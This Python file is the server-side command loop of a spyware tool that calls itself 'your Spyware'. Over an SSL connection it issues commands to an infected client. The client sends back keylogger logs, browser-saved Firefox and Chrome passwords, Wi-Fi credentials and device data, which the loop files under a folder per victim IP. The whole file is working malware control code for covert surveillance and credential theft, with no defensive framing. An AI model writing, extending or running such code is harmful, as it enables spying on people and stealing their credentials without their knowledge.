from Tools.Color import colors
from datetime import datetime
from Tools.Loop.terminal import terminal
from Tools.File_Tools.file import *
import os
import csv

def loop(port, host, client_ssl, ip_client):
    """Boucle principale de traitement des commandes."""
    
    def print_help():
        print(f"""{colors.orange}♦ Your server is listening on the port {port}
                    \n✅ On Server: {host}
                    \n✅ Connected to Client IP: {str(ip_client)}
                    \n• 'k'/'kill' to stop the spyware and save the result of the client
                    \n• 'surf' to save all the past password stored on the navigator Firefox and Chrome save on the client device only on Windows device
                    \n• 'all' to get ALL from the remote device ( Wifi, Password , device data and Keylogger data )
                     """)
    
    print(f"{colors.orange}Welcome to the lobby of your Spyware")
    print_help()
    target_dir = "Target"
    if not os.path.exists(target_dir):
        os.makedirs(target_dir) 
    ip_directory = os.path.join(target_dir, str(ip_client))
    
    if not os.path.exists(ip_directory):
        os.makedirs(ip_directory)
        
    while True:
        current_time = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        
        cli = terminal()
        
        if cli in ["kill", "k"]:
            print(f"Connection stopped with the client {ip_client}")
            client_ssl.send("STOP".encode())
            filename = os.path.join(ip_directory, f"KEYLOGGER_{current_time}.csv")
            receive_file(client_ssl, filename)
            print(f"Key logger result file received successfully. Client is OFF")
            client_ssl.close()
            exit(1)
        
        elif cli == "surf":
            client_ssl.send("SURF".encode())
            print("SURF")
            filename = os.path.join(ip_directory, f"KEYLOGGER_{current_time}.csv")
            filename_data = os.path.join(ip_directory, f"Password_{current_time}_.csv")
            receive_data_naviguator(client_ssl, filename_data,filename)
            print(f"{colors.green}Navigator password result successfully saved")
            exit(1)
        
        elif cli == "help":
            print_help()
        
        elif cli == "all":
            client_ssl.send("ALL".encode())
            print("ALL")
            filename = os.path.join(ip_directory, f"KEYLOGGER_{current_time}.csv")
            filename_data = os.path.join(ip_directory, f"Password_{current_time}_.csv")
            filename_wifi = os.path.join(ip_directory, f"WIFI_{current_time}_.txt")
            filename_device = os.path.join(ip_directory, f"Device_{current_time}_.txt")
            receive_all_data(client_ssl, filename_data, filename ,filename_wifi,filename_device)
            print(f"{colors.green}Navigator password result successfully saved")
            exit(1)
        
        else:
            print(f"AUTRE CHOSE")
            filename = os.path.join(ip_directory, f"KEYLOGGER_{current_time}.csv")
            receive_file(client_ssl, filename)
            print(f"Key logger result file received successfully. Client is OFF")
            client_ssl.close()
            break

        # Returning to the beginning of the loop
        print("Returning to the main lobby...")

